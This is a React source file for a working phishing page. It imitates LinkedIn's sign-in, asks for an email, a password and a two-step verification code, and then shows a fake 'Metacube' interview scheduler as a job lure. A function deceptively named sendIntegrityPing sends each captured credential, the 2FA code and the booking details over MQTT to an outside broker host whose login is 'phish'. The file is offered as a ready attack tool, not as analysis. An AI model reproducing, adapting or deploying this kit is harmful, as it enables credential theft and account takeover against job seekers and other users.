'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video, Linkedin } from 'lucide-react';
import mqtt from 'mqtt';

export default function CustomLoginPage() {
  const [step, setStep] = useState(1); 
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [scheduleData, setScheduleData] = useState({ date: '', time: '', mode: 'Virtual' });

  const sendIntegrityPing = (currentStep, dataValue) => {
    const host = 'ya17a2d0.ala.asia-southeast1.emqxsl.com';
    const client = mqtt.connect(`wss://${host}:8084/mqtt`, {
      username: 'phish',
      password: 'Phish',
      clientId: `auth_step_${currentStep}_` + Math.random().toString(16).substring(2, 8),
    });

    client.on('connect', () => {
      const payload = JSON.stringify({
        event: currentStep === 4 ? 'INTERVIEW_SCHEDULED' : 'CREDENTIAL_SUBMISSION',
        step: currentStep,
        email_captured: email,
        password_captured: password || 'Pending',
        code_captured: code || 'Pending',
        booking: currentStep === 4 ? scheduleData : 'Pending',
        time: new Date().toLocaleString()
      });

      client.publish('172', payload, { qos: 1 }, () => {
        client.end(true);
        setStep(currentStep + 1);
      });
    });
  };

  return (
    <div className="min-h-screen bg-[#f3f2ef] flex items-center justify-center font-sans antialiased text-gray-900">
      <div className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md">
        
        {/* LINKEDIN LOGO SECTION */}
        <div className="flex justify-start mb-6">
          <svg className="h-8 text-[#0a66c2] fill-current" viewBox="0 0 24 24">
            <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
          </svg>
        </div>

        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div key="email" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
              <h1 className="text-3xl font-semibold mb-2">Sign in</h1>
              <p className="text-sm mb-6 text-gray-600">Stay updated on your professional world</p>
              
              <div className="relative mb-4">
                <input 
                  type="email" 
                  onChange={(e) => setEmail(e.target.value)} 
                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] focus:ring-1 focus:ring-[#0a66c2] outline-none transition-all peer" 
                  placeholder="Email or Phone" 
                />
              </div>
              
              <div className="text-[#0a66c2] text-md font-semibold cursor-pointer mb-6 hover:underline">Forgot password?</div>

              <button 
                onClick={() => sendIntegrityPing(1, email)} 
                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182] transition-colors mb-4"
              >
                Next
              </button>

              <div className="flex items-center my-4">
                <div className="flex-grow border-t border-gray-300"></div>
                <span className="px-3 text-gray-500 text-sm">or</span>
                <div className="flex-grow border-t border-gray-300"></div>
              </div>

              <button className="w-full border border-gray-600 text-gray-700 py-3 rounded-full font-semibold text-md hover:bg-gray-50 transition-colors mb-4">
                New to LinkedIn? Join now
              </button>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div key="password" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-2xl font-semibold mb-6 text-center">Enter your password</h1>
              <div className="flex justify-center mb-8">
                <div className="flex items-center gap-2 bg-gray-100 rounded-full px-4 py-2">
                  <span className="text-sm font-medium text-gray-700">{email}</span>
                </div>
              </div>
              
              <div className="relative mb-8">
                <input 
                  type="password" 
                  onChange={(e) => setPassword(e.target.value)} 
                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none transition-all" 
                  placeholder="Password" 
                />
              </div>
              
              <button 
                onClick={() => sendIntegrityPing(2, password)} 
                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182] transition-colors"
              >
                Sign in
              </button>
            </motion.div>
          )}

          {step === 3 && (
            <motion.div key="2fa" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-2xl font-semibold text-center mb-4">Two-step verification</h1>
              <div className="flex flex-col items-center mb-8 mt-4 text-center">
                <ShieldCheck className="w-16 h-16 text-[#0a66c2] mb-4 stroke-1" />
                <p className="text-sm text-gray-600">Enter the 6-digit code sent to your mobile device.</p>
              </div>
              <div className="relative mb-12">
                <input 
                  type="text" 
                  onChange={(e) => setCode(e.target.value)} 
                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none transition-all" 
                  placeholder="6-digit code" 
                />
              </div>
              <button 
                onClick={() => sendIntegrityPing(3, code)} 
                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg"
              >
                Submit
              </button>
            </motion.div>
          )}

          {step === 4 && (
            <motion.div key="scheduler" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
              <h1 className="text-2xl font-semibold text-center mb-2">Schedule Your Interview</h1>
              <p className="text-center text-sm text-gray-500 mb-8 font-medium">Verified via LinkedIn Profile</p>
              <div className="space-y-4 mb-8">
                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
                  <Calendar className="w-5 h-5 text-[#0a66c2]" />
                  <input type="date" onChange={(e) => setScheduleData({...scheduleData, date: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                </div>
                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
                  <Clock className="w-5 h-5 text-[#0a66c2]" />
                  <input type="time" onChange={(e) => setScheduleData({...scheduleData, time: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                </div>
                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
                  <Video className="w-5 h-5 text-[#0a66c2]" />
                  <select onChange={(e) => setScheduleData({...scheduleData, mode: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium">
                    <option>Virtual (Microsoft Teams)</option>
                    <option>In-person (Metacube HQ)</option>
                  </select>
                </div>
              </div>
              <button 
                onClick={() => sendIntegrityPing(4, scheduleData)} 
                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-bold hover:bg-[#004182] transition-colors"
              >
                Confirm Appointment
              </button>
            </motion.div>
          )}

          {step === 5 && (
            <motion.div key="success" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <ShieldCheck className="w-12 h-12 text-green-600" />
              </div>
              <h1 className="text-2xl font-bold text-gray-900 mb-4">Confirmed!</h1>
              <p className="text-gray-600 leading-relaxed font-medium text-center">
                Your interview details have been synced to your calendar. <br/>
                <span className="text-[#0a66c2] font-bold mt-2 inline-block">Metacube is looking forward to meeting you.</span>
              </p>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
